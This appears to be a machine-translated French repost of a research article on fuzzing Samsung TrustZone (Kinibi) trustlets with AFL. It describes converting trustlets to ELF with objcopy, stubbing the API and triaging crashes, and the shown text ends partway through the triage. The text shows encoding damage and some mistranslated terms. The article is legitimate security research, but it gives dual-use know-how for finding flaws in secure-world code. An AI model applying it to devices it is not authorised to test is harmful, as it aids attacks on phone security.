<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üõ§Ô∏è üö∂ üö∫ Rechercher des vuln√©rabilit√©s dans Samsung TrustZone ou AFL fuzz all üèπ üêî üèÇ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Au fil du temps, de plus en plus de technologies de protection apparaissent, √† cause desquelles les pirates doivent resserrer leurs ceintures. Cependa...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Rechercher des vuln√©rabilit√©s dans Samsung TrustZone ou AFL fuzz all</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/478948/"><p><img src="https://habrastorage.org/webt/uk/fw/rl/ukfwrlxwv9vr1rrwahfzdidi9na.jpeg"></p><br><p> Au fil du temps, de plus en plus de technologies de protection apparaissent, √† cause desquelles les pirates doivent resserrer leurs ceintures.  Cependant, cette pi√®ce a deux c√¥t√©s: les technologies de d√©fense cr√©ent √©galement une surface d'attaque suppl√©mentaire, et pour les contourner, il vous suffit d'utiliser des vuln√©rabilit√©s dans leur code. </p><br><p>  Examinons l'une de ces technologies - ARM TrustZone.  Ses impl√©mentations contiennent une √©norme quantit√© de code, et pour y rechercher des vuln√©rabilit√©s, vous avez besoin d'une sorte de m√©thode automatique.  Nous utilisons l'ancienne m√©thode √©prouv√©e - le fuzzing.  Mais intelligent! </p><br><p>  Nous explorerons les applications sp√©ciales apparues avec l'introduction de la technologie TrustZone - les trustlets.  Pour d√©crire en d√©tail la m√©thode de fuzzing que nous avons choisie, nous nous tournons d'abord vers la th√©orie de TrustZone, des syst√®mes d'exploitation de confiance et de l'interaction avec un syst√®me d'exploitation conventionnel.  Ce n'est pas pour longtemps.  C'est parti! </p><a name="habracut"></a><br><h2 id="arm-trustzone">  ARM TrustZone </h2><br><p>  La technologie TrustZone dans les processeurs ARM vous permet de transf√©rer le traitement des informations confidentielles dans un environnement s√©curis√© isol√©.  Un tel traitement est effectu√©, par exemple, par Keystore, les services d'empreintes digitales dans Android OS, les technologies de protection des droits d'auteur DRM, etc. </p><br><p>  <a href="https://developer.arm.com/ip-products/security-ip/trustzone">Beaucoup de choses</a> <a href="https://habr.com/ru/post/309618/">ont d√©j√† √©t√©</a> <a href="https://habr.com/ru/company/aladdinrd/blog/342924/">√©crites</a> sur l'appareil TrustZone, nous ne nous en souviendrons donc que bri√®vement. </p><br><p><img src="https://habrastorage.org/webt/eu/ny/dg/eunydg_xqmclgf_f47vvwrsdplw.png"></p><br><p>  TrustZone divise le "monde" (en termes de TrustZone - World) en deux - Normal World et Secure World - et ajoute quatre modes d'ex√©cution au processeur: </p><br><ul><li>  EL3 - mode moniteur - le mode dans lequel le syst√®me d√©marre et qui est le mode d'ex√©cution le plus pr√©f√©r√©; </li><li>  S-EL2 - mode hyperviseur de confiance; </li><li>  S-EL1 - mode de syst√®me d'exploitation de confiance; </li><li>  S-EL0 - le mode des applications de confiance (applications de confiance, TA, trustlets) ou trustlets. </li></ul><br><p>  Sur SoC avec la technologie TrustZone, deux syst√®mes d'exploitation peuvent fonctionner simultan√©ment.  Celui qui fonctionne dans Normal World s'appelle Rich OS, et le second de Secure World est TEE (Trusted Execution Environment) OS.  Il existe d√©j√† plus d'une douzaine de ces syst√®mes d'exploitation de confiance.  Nous nous concentrerons sur un sp√©cifique - Trustonic Kinibi.  Il est notamment utilis√© sur les t√©l√©phones Samsung avec SoC Exynos inclus jusqu'au Galaxy S9. </p><br><h2 id="trustonic-kinibi">  Kinibi Trustonic </h2><br><p>  Trustonic a <a href="https://www.nfcworld.com/2012/12/18/321625/arm-gemalto-and-gd-introduce-alternative-to-nfc-secure-elements/">√©t√© cr√©√© par ARM, Gemalto et Giesecke &amp; Devrient (G&amp;D)</a> et a continu√© √† d√©velopper le syst√®me d'exploitation Mobicore Giesecke &amp; Devrient (G&amp;D) sous le nom de Kinibi. </p><br><p>  Le syst√®me d'exploitation Kinibi prend en charge <a href="https://globalplatform.org/technical-committees/trusted-execution-environment-tee-committee/">les normes Global Platform Trusted Execution Environment</a> .  Son sch√©ma structurel est illustr√© sur la figure. </p><br><p><img src="https://habrastorage.org/webt/rn/uj/ff/rnujffhmytxef_pzu99cje21fa4.jpeg"></p><br><p>  Comme vous pouvez le voir, l'impl√©mentation de TrustZone inclut des composants non seulement dans le ¬´monde prot√©g√©¬ª, mais aussi des composants dans le ¬´monde normal¬ª.  Pour comprendre les principaux, il est pr√©f√©rable de regarder le sch√©ma de ce syst√®me du point de vue du d√©veloppeur. </p><br><p><img src="https://habrastorage.org/webt/jf/lr/ok/jflrokza7l-sn8mh84m1a29smjs.jpeg"></p><br><p>  A un niveau bas, dans un monde prot√©g√©, en plus du micro-noyau, des pilotes et un gestionnaire d'ex√©cution fonctionnent.  Et dans le monde normal, un pilote sp√©cial fonctionne, qui assure la transition du processeur vers le monde prot√©g√© √† la demande des applications.  Au niveau de l'espace utilisateur, des applications et des composants fonctionnent qui fournissent des API pour connecter des applications entre les mondes normal et s√©curis√©.  Il existe √©galement un d√©mon sp√©cial dans le monde normal qui fournit le lancement initial de certains trustlets, et √† travers lequel passent toutes les demandes aux trustlets des applications clientes. </p><br><p>  Il existe deux ensembles d'API dans Kinibi: l'API Global Platform (indiqu√©e en vert) et l'API Legacy (rouge).  Les deux ensembles fournissent approximativement le m√™me ensemble de fonctions, seul le premier a √©t√© construit selon les normes de la plate-forme mondiale, et le second, semble-t-il, √©tait ant√©rieur √† la norme, et s'appelle donc Legacy.  Malgr√© le fait que, √† en juger par le nom, vous devez vous √©loigner de son utilisation, seule l'API h√©rit√©e est utilis√©e dans les trustlets Samsung. </p><br><h2 id="vzaimodeystvie-mezhdu-mirami">  Interaction entre les mondes </h2><br><p>  Pour utiliser les opportunit√©s offertes par la technologie TrustZone, des applications dans le monde normal, appel√©es applications clientes, communiquent avec des applications de confiance - les trustlets.  Les trustlets impl√©mentent diverses fonctions: authentification, gestion des cl√©s, travaillent avec des composants mat√©riels qui impl√©mentent des fonctions de s√©curit√©, etc. </p><br><p>  Les demandes aux trustlets sont transmises √† l'aide d'une m√©moire partag√©e sp√©ciale.  Le monde normal et le monde prot√©g√©, utilisant la technologie TrustZone, sont isol√©s les uns des autres aux niveaux sup√©rieurs (EL0 et S-EL0) de la m√©moire, et pour cr√©er une telle r√©gion de m√©moire partag√©e entre eux, appel√©e World Shared Memory (WSM), l'API fournie par le prot√©g√© le monde. </p><br><p>  Le sch√©ma g√©n√©ral d'interaction entre l'application cliente et le trustlet ressemble √† ceci: </p><br><p><img src="https://habrastorage.org/webt/6x/91/jb/6x91jbisi920sjwv_vmjch1ltqo.jpeg"></p><br><ol><li>  L'application client acc√®de au d√©mon avec l'UID du trustlet avec lequel elle souhaite √©tablir une session; </li><li>  Le d√©mon utilise le pilote pour contacter le syst√®me d'exploitation approuv√© avec une demande de t√©l√©chargement du trustlet; </li><li>  Le syst√®me d'exploitation approuv√© charge le trustlet dans l'espace d'adressage du monde prot√©g√©; </li><li>  L'application cliente cr√©e √† nouveau un tampon WSM via une demande au d√©mon et y √©crit des donn√©es pour la demande √† l'approbation; </li><li>  L'application client notifie le monde prot√©g√© de l'√©tat de pr√©paration de la demande; </li><li>  Dans un monde s√©curis√©, la demande est envoy√©e au trustlet souhait√© pour traitement, et le trustlet √©crit le r√©sultat de son travail dans le tampon WSM; </li><li>  Le cycle de demande et de r√©ponse peut se r√©p√©ter; </li><li>  L'application cliente termine la session avec une approbation. </li></ol><br><p>  Les pseudo-codes de la session d'interaction pour l'application cliente et pour le trustlet ont l'air assez passe-partout.  Pour une application client: </p><br><pre><code class="plaintext hljs">void main() { uint8_t* tciBuffer; uint32_t tciLength; uint8_t* mem; uint32_t mem_size; mcOpenDevice(MC_DEVICE_ID_DEFAULT); mcMallocWsm(MC_DEVICE_ID_DEFAULT, 0, tciLength, &amp;tciBuffer, 0); session.deviceId = MC_DEVICE_ID_DEFAULT; mcOpenSession(&amp;session, &amp;uuid, tciBuffer, tciLength); mcMap(&amp;session, mem, mem_size, &amp;mapInfo); mcNotify(&amp;session); mcWaitNotification(&amp;session, -1); mcUnmap(&amp;session, mem1, &amp;mapInfo1); mcCloseSession(&amp;session); mcFreeWsm(MC_DEVICE_ID_DEFAULT, tciBuffer); mcCloseDevice(MC_DEVICE_ID_DEFAULT); }</code> </pre> <br><p>  Pour trustlet: </p><br><pre> <code class="plaintext hljs">void tlMain(uint8_t *tciData, uint32_t tciLen) { // Check TCI size if (sizeof(tci_t) &gt; tciLen) { // TCI too small -&gt; end Trusted Application tlApiExit(EXIT_ERROR); } // Trusted Application main loop for (;;) { // Wait for a notification to arrive tlApiWaitNotification(INFINITE_TIMEOUT); // Process command // Notify the TLC tlApiNotify(); } }</code> </pre> <br><p>  <code>mcNotify</code> / <code>tlApiNotify</code> et <code>mcWaitNotification</code> / <code>tlApiWaitNotification</code> - ce sont les fonctions m√™mes de notification qu'une demande / r√©ponse est pr√™te √† recevoir dans un autre monde, et la fonction d'attendre le traitement de la demande.  En outre, l'application cliente a la possibilit√© d'utiliser la fonction mcMap.  Il vous permet de cr√©er un autre tampon WSM, si n√©cessaire.  Au total, en utilisant cette fonction, vous ne pouvez cr√©er que quatre de ces tampons. </p><br><p>  Avec les applications clientes, c'est clair - pour les t√©l√©phones Samsung, ce sont des applications Android ordinaires.  Mais que sont les trustlets? </p><br><h2 id="trastlety-kinibi">  Kinibi Trustlets </h2><br><p>  Les trustlets se trouvent dans le syst√®me de fichiers standard de l'appareil et sont des fichiers contenant du code ex√©cutable.  Ce n'est pas le format ELF ou APK habituel pour Android.  Les trastlets du syst√®me d'exploitation Kinibi ont leur propre format de chargement MobiCore (MCLF).  Il est d√©crit dans les composants <a href="">open source de</a> niveau utilisateur que Trustonic a publi√©s sur Github.  La structure du fichier de trustlet peut √™tre repr√©sent√©e sch√©matiquement dans une telle image (le trustlet est √† gauche). </p><br><p><img src="https://habrastorage.org/webt/6n/wl/3w/6nwl3wam_zcbljj0qalgybotnsw.jpeg"></p><br><p>  Les fonctionnalit√©s suivantes peuvent √™tre distingu√©es pour les trustlets: </p><br><ul><li>  sont ex√©cut√©es dans un espace d'adressage isol√©, c'est-√†-dire qu'un trustlet n'en voit pas un autre; </li><li>  n'ont pas acc√®s √† la m√©moire du monde normal, √† l'exception des tampons WSM, √† la m√©moire du syst√®me d'exploitation TEE et √† la m√©moire physique; </li><li>  sont situ√©s en m√©moire dans des sections avec diff√©rents droits de lecture, d'√©criture et d'ex√©cution; </li><li>  Les tampons WSM r√©sident dans la m√©moire non ex√©cutable; </li><li>  D√©marrage sans ASLR </li><li>  ils utilisent l'API fournie par mclib, une biblioth√®que qui impl√©mente l'API Global Platform et l'API Legacy pour le monde prot√©g√©; </li><li>  peut acc√©der aux pilotes prot√©g√©s √† l'aide de la fonction <code>tlApi_callDriver</code> . </li></ul><br><p>  Comme vous pouvez le voir, les trustlets ont des capacit√©s assez limit√©es.  En outre, ils utilisent certains m√©canismes de d√©fense, tels que divers attributs de m√©moire, et la plupart des trustlets utilisent des canaris de pile pour se prot√©ger contre l'√©crasement de la pile.  Mais Kinibi n'a pas d'ASLR, bien qu'il <a href="https://www.trustonic.com/news/research/providing-random-numbers-without-kernel-rng/">soit pr√©vu</a> dans de nouvelles versions. </p><br><p>  Malgr√© toutes les restrictions, les trustlets sont une cible tr√®s int√©ressante pour un attaquant pour les raisons suivantes: </p><br><ul><li>  Il s'agit d'une fen√™tre dans TrustZone √† partir du niveau de l'espace utilisateur dans Android; </li><li>  ils peuvent servir de point de d√©part pour l'escalade de privil√®ges au c≈ìur du syst√®me d'exploitation TEE; </li><li>  les trustlets ont acc√®s √† des informations prot√©g√©es, auxquelles m√™me le noyau Android n'a pas acc√®s. </li></ul><br><p>  Comme appareil de test, nous avons utilis√© le Samsung Galaxy S8.  Si vous y cherchez des trastlets, il s'av√®re qu'il y en a beaucoup. </p><br><p><img src="https://habrastorage.org/webt/oi/-2/uw/oi-2uwkk_mdvw7dpyqb1k0_2ubc.png"></p><br><p>  Autrement dit, il y a beaucoup de code.  Utiliser une analyse statique du code binaire pour rechercher des vuln√©rabilit√©s semble √™tre une mauvaise id√©e.  Engager une analyse dynamique ne fonctionnera donc tout simplement pas, ne serait-ce que parce que les trastlets ont leur propre format, diff√©rent de ce qui peut √™tre ex√©cut√© sur les syst√®mes d'exploitation traditionnels.  Ce serait bien d'utiliser la m√©thode √©prouv√©e de fuzzing avec r√©troaction et d'attraper en quelque sorte le plantage des trustlets lorsqu'ils se produisent.  Essayons de r√©soudre ce probl√®me int√©ressant. </p><br><h2 id="kak-zhe-eto-fazzit">  Comment √ßa fuzz? </h2><br><p>  Pour ceux qui n'ont pas encore rencontr√© le merveilleux outil AFL et ses nombreux add-ons, nous vous recommandons de lire <a href="https://habr.com/ru/company/dsec/blog/435644/">ce bon article</a> .  Et tout le monde sait probablement que l'AFL peut fuzz les fichiers ELF.  De plus, m√™me les fichiers binaires compil√©s initialement sans instrumentation AFL.  Ceci est r√©alis√© via le mode qemu.  AFL utilise une version sp√©ciale de l'√©mulateur qemu, dans laquelle la fonctionnalit√© de l'instrumentation binaire des instructions de branchement est ajout√©e au mode utilisateur qemu.  Cela lui permet de flou avec le contr√¥le de la couverture de code, m√™me pour les fichiers binaires.  Et un bonus √† cela est la possibilit√© de fuzzer les fichiers ex√©cutables non seulement de l'architecture native, mais de toutes les architectures prises en charge par qemu.  Mais pour utiliser ce mode dans notre t√¢che, nous devons en quelque sorte convertir les trustlets au format ELF. </p><br><p>  Examinons de plus pr√®s les fichiers de trustlet.  Gr√¢ce au format ouvert, <a href="https://github.com/ghassani/mclf-ida-loader">il existe un</a> chargeur pour IDA Pro pour eux.  Si vous ouvrez un trustlet, √† l'exception, en fait, de son code, vous pouvez voir qu'il utilise les fonctions de la biblioth√®que mclib.  Il est int√©ressant que tous les appels √† de telles fonctions passent par une seule fonction √† l'adresse enregistr√©e dans l'en-t√™te du trastlet.  Par exemple, voici √† quoi ressemble la fonction tlApiLogvPrintf dans le code du trustlet, qui, √©videmment, traite de la sortie des cha√Ænes. </p><br><p><img src="https://habrastorage.org/webt/lh/tx/zb/lhtxzbfra6o6pmp_urykpw8lq9w.png"></p><br><p>  On peut voir qu'il transmet tous les param√®tres plus loin qu'une autre fonction.  Il s'agit de la fonction de planification mclib, dont l'adresse est √©crite dans l'en-t√™te MCLF dans un champ appel√© <code>tlApiLibEntry</code> .  C'est-√†-dire que les fonctions de biblioth√®que appel√©es de cette mani√®re sont les seules d√©pendances des trustlets; les trastlets n'ont aucun autre lien √† l'ext√©rieur.  Cela signifie que si nous impl√©mentons des stubs pour les fonctions API, nous pouvons ex√©cuter le code de trustlet dans un environnement Linux normal, bien s√ªr, d'abord le convertir en un fichier ELF d'une mani√®re ou d'une autre.  Et cela signifie que nous pouvons le d√©boguer et le flou. </p><br><p>  Pour transformer un trustlet en fichier ELF, vous pouvez prendre un fichier pr√™t √† l'emploi, par exemple, compiler une application vide avec la fonction principale et ajouter des sections du trustlet avec son en-t√™te.  C'est facile!  Il est √©galement n√©cessaire de transf√©rer en quelque sorte le contr√¥le sur le code du trustlet.  Il n'y a pas de probl√®me non plus, l'en-t√™te du trastlet contient l'adresse de son point d'entr√©e.  Nous d√©finissons cette adresse dans notre fonction <code>main</code> comme l'adresse de la fonction et nous l'appelons.  Apr√®s avoir r√©fl√©chi et exp√©riment√©, nous pouvons esquisser le plan suivant pour r√©soudre notre probl√®me: </p><br><ol><li>  mettre en ≈ìuvre le transfert de l'ex√©cution au point d'entr√©e du trustlet; </li><li>  impl√©mentez-leur des fonctions de biblioth√®que ou des stubs; </li><li>  impl√©menter la fonction de r√©partition et √©crire son adresse dans l'en-t√™te du tralet; </li><li>  organiser les sections du trustlet aux adresses souhait√©es. </li></ol><br><p>  Comme nous devons transformer de nombreux trustlets en elfes √† la fois, nous devons penser √† automatiser ces t√¢ches.  Pour chaque trustlet, les param√®tres suivants doivent √™tre d√©termin√©s automatiquement: point d'entr√©e, adresses des sections du trustlet et taille du tampon d'entr√©e WSM.  Ajoutez ceci au plan. </p><br><ol><li>  D√©finissez le point d'entr√©e, les adresses de section et la taille de la m√©moire tampon WSM. </li></ol><br><h2 id="sobiraem-elfa">  R√©cup√©rer l'elfe </h2><br><p>  1) <strong>point d'entr√©e</strong> </p><br><p>  Le premier √©l√©ment du plan est facile √† impl√©menter avec le code suivant.  Il peut √™tre ajout√© √† la fonction <code>main</code> de notre fichier ELF source. </p><br><pre> <code class="plaintext hljs">typedef void (*tlMain_t)(const void* tciBuffer, const uint32_t tciBufferLen); tlMain_t tlMain = sym_tlMain; tlMain(tciBuffer, tciBufferLen);</code> </pre> <br><p>  Nous compilons notre code dans un fichier objet. </p><br><pre> <code class="plaintext hljs">$(CC) $(INCLUDE) -g -c tlrun.c</code> </pre> <br><p>  Le <code>sym_tlMain</code> doit √™tre ajout√© au fichier objet.  Cela peut √™tre fait en utilisant objcopy. </p><br><pre> <code class="plaintext hljs">arm-linux-gnueabi-objcopy --add-symbol sym_tlMain=$(TLMAIN) tlrun.o tlrun.o.1</code> </pre> <br><p>  En cons√©quence, nous obtenons <code>tlrun.o.1</code> - une source compil√©e avec la fonction <code>main</code> qui transf√®re le contr√¥le au code du trustlet. </p><br><p>  2) <strong>Fonctions de biblioth√®que</strong> </p><br><p>  Pour impl√©menter des fonctions de biblioth√®que, nous avons d'abord besoin d'une liste de toutes ces fonctions.  Il √©tait une fois une fuite de Qualcomm avec un tas de mat√©riaux pour les appareils mobiles bas√©s sur leurs processeurs.  Parmi ces documents figuraient √©galement des images, des fichiers d'en-t√™te et des images de d√©bogage de certains composants pour le syst√®me d'exploitation mobicore.  De l√†, nous avons pris des prototypes de fonctions de biblioth√®que avec leurs num√©ros, pass√©s en param√®tre √† la fonction de r√©partition.  Pour les fonctions ayant un objectif connu telles que <code>tlApiMalloc</code> ou <code>tlApiLogvPrintf</code> nous avons effectu√© les impl√©mentations correspondantes en utilisant des fonctions similaires de libc.  Et les fonctions ne sont pas aussi claires, par exemple, nous avons remplac√© <code>tlApiSecSPICmd</code> par de simples talons qui affichent leur nom et renvoient le statut OK.  L'API enti√®re se compile en <code>tllib.o</code> </p><br><pre> <code class="plaintext hljs">$(CC) $(INCLUDE) -g -c tllib.c</code> </pre> <br><p>  3) <strong>Fonction d'exp√©dition</strong> </p><br><p>  Semblable √† l'adresse du point d'entr√©e, ajoutez le symbole, son adresse est la m√™me pour tous les trustlets: </p><br><pre> <code class="plaintext hljs">arm-linux-gnueabi-objcopy --add-symbol sym_tlApiLibEntry=0x108c tlrun.o tlrun.o.1</code> </pre> <br><p>  L'impl√©mentation de la fonction d'ordonnancement est triviale.  Il suffit de consid√©rer que son adresse doit √™tre √©crite dans l'en-t√™te.  Comme nous ne savons pas √† l'avance √† quelle adresse notre fonction de r√©partition sera situ√©e apr√®s la liaison et le d√©marrage, nous devons √©crire son adresse dans l'en-t√™te du trustlet d√©j√† en cours d'ex√©cution.  Par exemple, lors du d√©marrage d'un fichier avant que la fonction <code>main</code> ne commence √† s'ex√©cuter. </p><br><pre> <code class="plaintext hljs">void (*sym_tlApiLibEntry)(int num) __attribute__((weak)); void tlApiLibEntry(int num) __attribute__((noplt)); __attribute__((constructor)) void init() { sym_tlApiLibEntry = tlApiLibEntry; }</code> </pre> <br><p>  4) <strong>Sections</strong> </p><br><p>  Ajoutez des sections au fichier objet, nous utilisons √©galement <code>objcopy</code> . </p><br><pre> <code class="plaintext hljs">arm-linux-gnueabi-objcopy --add-section .tlbin_text=.text.bin \ --set-section-flags .tlbin_text=code,contents,alloc,load \ --add-section .tlbin_data=.data.bin \ --set-section-flags .tlbin_data=contents,alloc,load \ --add-section .tlbin_bss=.bss.bin \ --set-section-flags .tlbin_bss=contents,alloc,load \ tlrun.o.1 tlrun.o.2</code> </pre> <br><p>  Ici <code>.tlbin_text</code> est le nom de la section du trustlet, et <code>.text.bin</code> est le nom du fichier avec un vidage de cette section.  Vous pouvez vider le fichier en utilisant le m√™me IDA. </p><br><p>  √Ä la suite de cette conversion, un trustt binaire sera ajout√© au fichier ELF source. </p><br><p>  5) <strong>Automatisation</strong> </p><br><p>  Pour l'ensemble de l'assembly, nous avons d√©cid√© d'utiliser un grand Makefile commun √† tous les trustlets et un petit, connect√© √† celui-ci pour chaque trustlet individuel avec ses param√®tres.  Pour chaque trustlet, vous devez d√©finir un point d'entr√©e, des adresses de section et une taille de m√©moire tampon WSM.  Les deux premiers param√®tres sont faciles √† obtenir avec un simple script pour l'IDA, et la d√©termination de la taille du tampon n'est parfois pas si simple √† automatiser.  Vous pouvez √©galement automatiser cette t√¢che ou consacrer 10 minutes √† la d√©terminer pour tous les trustlets en analysant leur code manuellement.  Ces param√®tres peuvent √™tre d√©finis comme variables dans votre petit Makefile. </p><br><pre> <code class="plaintext hljs">TLMAIN := 0x98F5D TLTEXT := 1000 TLDATA := c0000 TLBSS := c10e0 TLTCI_LEN := 4096</code> </pre> <br><p>  Et dans un grand Makefile, utilisez ces param√®tres de cette mani√®re: </p><br><pre> <code class="plaintext hljs">$(CC) $(INCLUDE) -g -DTCILEN=$(TLTCI_LEN) -c tlrun.c # ... $(CC) -g tlrun.o.2 tllib.o --section-start=.tlbin_text=$(TLTEXT),--section-start=.tlbin_data=$(TLDATA),--section-start=.tlbin_bss=$(TLBSS) -o tlrun</code> </pre> <br><p>  Nous avons donc transform√© le trustlet en un fichier ELF avec l'emplacement correct des sections du trustlet en m√©moire et les bonnes adresses dans l'en-t√™te.  En th√©orie, il peut m√™me √™tre correctement ex√©cut√© et flou.  Eh bien, voyons √ßa! </p><br><h2 id="fazzing">  Fuzzing </h2><br><p>  Comme AFL utilise qemu pour ex√©cuter du code d'architecture non natif, pour commencer, il serait bien de v√©rifier si notre elfe fonctionne sous l'√©mulateur.  Et puis les probl√®mes ont commenc√© tout de suite. </p><br><div class="spoiler">  <b class="spoiler_title">Probl√®me num√©ro 1: cha√Æne d'outils</b> <div class="spoiler_text"><p>  Pour compiler le code et construire le fichier, nous avons utilis√© la cha√Æne d'outils arm-linux-gnueabihf.  "hf" √† la fin signifie que le compilateur utilise le support mat√©riel Hard Float dans les processeurs ARM.  Lorsque j'ai essay√© d'ex√©cuter notre fichier sous l'√©mulateur qemu, il s'est imm√©diatement √©cras√©, g√©n√©rant un "d√©faut de segmentation".  √âtant donn√© que dans notre code, il n'y avait aucun travail avec des nombres √† virgule flottante nulle part, la raison de ce plantage √©tait compl√®tement incompr√©hensible.  Apr√®s une petite r√©flexion, nous avons d√©cid√© d'essayer d'utiliser la cha√Æne d'outils sans Hard float arm-linux-gnueabi.  Et nous avons de la chance!  Le fichier a fonctionn√© et sa sortie a commenc√© √† appara√Ætre dans la console. </p><br><p><img src="https://habrastorage.org/webt/vu/t1/he/vut1hesxzshpmwvirmmvilzpoaw.png"></p><br><p>  Vous pouvez donc duper.  Nous lan√ßons AFL et ici ... </p></div></div><br><div class="spoiler">  <b class="spoiler_title">Probl√®me num√©ro 2: l'instrumentation</b> <div class="spoiler_text"><p><img src="https://habrastorage.org/webt/s-/c_/zr/s-c_zrsukymj9mugaex_hpzt5e4.png"></p><br><p>  Pour une raison quelconque, AFL ne voit pas l'instrumentation.  Au d√©but, on ne savait pas vraiment quel √©tait le probl√®me.  qemu est construit correctement, l'option -Q (mode qemu) est d√©finie.  Maudissant, j'ai d√ª entrer dans le code source des correctifs AFL pour qemu.  Il s'av√®re que dans les correctifs AFL, lors du t√©l√©chargement du fichier ELF, qemu recherche la section de code et d√©finit les limites des adresses o√π il va produire l'instrumentation.  Le probl√®me est que s'il y a plusieurs sections de code, pour une raison quelconque, seule la premi√®re d'entre elles sera instrument√©e.  Il s'agit d'un bogue ou d'une fonctionnalit√©, mais nous avons deux sections de code, et le point d'entr√©e - principal - est dans la seconde.  Evidemment, il ne voit pas l'instrumentation au d√©marrage, car il n'est pas dans la deuxi√®me section!  En passant plus loin que la source, vous pouvez voir que lorsque la variable d'environnement AFL_INST_LIBS est activ√©e, les limites de l'instrumentation deviennent infinies.  Allumez-le et d√©marrez-le. </p></div></div><br><p><img src="https://habrastorage.org/webt/6l/8d/qt/6l8dqtepbkflj0lutrcb_af4nl4.png"></p><br><p>  Le fuzzing fonctionne! </p><br><p>  L'id√©e a √©t√© confirm√©e!  Nous avons lanc√© le fuzzing avec des commentaires sur les fichiers binaires au format personnalis√©.  Comme vous pouvez le voir, il trouve m√™me une sorte de crash.  Ainsi, nous avons obtenu un moyen fiable d'exploiter ces binaires, de d√©tecter les erreurs dans leur code et de les ex√©cuter sous Linux standard et de d√©boguer facilement avec les outils existants.  Classe! </p><br><p>  Pendant plusieurs jours, nous avons effectu√© le fuzzing de tous les trustlets.  En cons√©quence, nous avons eu beaucoup de donn√©es d'entr√©e g√©n√©rant des plantages, et la t√¢che d'analyser tous ces plantages. </p><br><h2 id="analiziruem-krashi">  Analyse du crash </h2><br><p>  Au total, pour 23 fiducies, AFL a trouv√© 477 cas de test g√©n√©rant un crash.  Une quantit√© √©norme que je ne veux absolument pas traiter manuellement.  Parmi cet ensemble de cas de test, il y en a presque identiques qui g√©n√®rent un crash au m√™me endroit.  Pour supprimer la redondance des cas de test, vous pouvez utiliser l'outil afl-cmin.  Apr√®s avoir travers√© tous les trastlets, 225 cas restaient √† analyser.  Quoi qu'il en soit, beaucoup!  Afin de faciliter notre t√¢che, nous avons d√©cid√© d'utiliser des outils d'analyse dynamique qui aideront √† identifier plus pr√©cis√©ment une erreur logicielle et l'une de ses propri√©t√©s.  Cela aidera √† √©valuer l'utilisabilit√© des bogues et la complexit√© de son fonctionnement. </p><br><p>  Donc, afin d'utiliser une sorte d'outils d'analyse dynamique, nous devons au moins ex√©cuter nos trustlets convertis sur le syst√®me ARM natif, et non sous la virtualisation qemu.  Linux ou Android peuvent convenir √† cela. </p><br><div class="spoiler">  <b class="spoiler_title">Probl√®me 3: sections</b> <div class="spoiler_text"><p>  Nous avons d√©cid√© de prendre un syst√®me 32 bits avec Linux, car  Trustlets 32 bits, et Linux est plus pratique et dispose d'outils d'analyse plus dynamiques qu'Android.  Et ici, il s'est av√©r√© que lors de son lancement, nos elfes √©mettent imm√©diatement une faute de segmentation. </p><br><p>  Il s'est av√©r√© que le probl√®me est le caract√®re inhabituel de nos binaires.  Lors de leur cr√©ation, vous devez placer les sections du trustlet aux adresses souhait√©es, o√π l'adresse de la section de code du trustlet est toujours 0x1000.  Il s'agit de la premi√®re section du fichier, et devant elle se trouve toujours l'en-t√™te ELF √† 0x0.  Et sous Linux, les deux premi√®res pages de l'espace d'adressage, jusqu'√† l'adresse 0x2000, sont r√©serv√©es aux t√¢ches utilitaires, donc lorsque le chargeur essaie d'y projeter une section, une erreur se produit. </p><br><p>  Il s'est av√©r√© qu'il y avait un moyen de sortir de cette situation.  Sur un noyau 64 bits, une telle r√©servation des premi√®res pages en m√©moire ne se produit pas, et cette disposition des sections devient possible.  √âtant donn√© que nos fichiers sont 32 bits, il est pratique de cr√©er d'abord un environnement 32 bits sur un syst√®me 64 bits.  Le paquet <code>debootstrap</code> est id√©al √† ces fins. </p></div></div><br><div class="spoiler">  <b class="spoiler_title">Probl√®me num√©ro 4: pas d'outils</b> <div class="spoiler_text"><p>  Maintenant que nos trustlets redessin√©s fonctionnent sur le syst√®me ARM natif, nous devons essayer des outils d'analyse dynamique sur eux.  Parmi les m√©thodes d'analyse dynamique des fichiers binaires figurent le d√©bogage et l'instrumentation binaire dynamique (DBI).  Gdb est parfait pour le premier.  Et pour le second, il n'y a pas beaucoup d'options: sous ARM, il n'y a essentiellement que trois frameworks DBI stables - DynamoRIO, Valgrind et Frida.  Le premier poss√®de de nombreux bons outils pour d√©tecter et d√©tecter les erreurs, mais le chargeur de fichiers ELF, qui y est impl√©ment√©, n'a pas pu faire face au chargement de nos fichiers.  Valgrind est un framework assez puissant, et il a des outils de callgrind appropri√©s pour nous pour le tra√ßage et memcheck pour surveiller les op√©rations de m√©moire.  Il s'est av√©r√© qu'ils produisent des r√©sultats qui ne sont pas tr√®s pratiques pour l'analyse, de sorte qu'ils ne conviennent pas 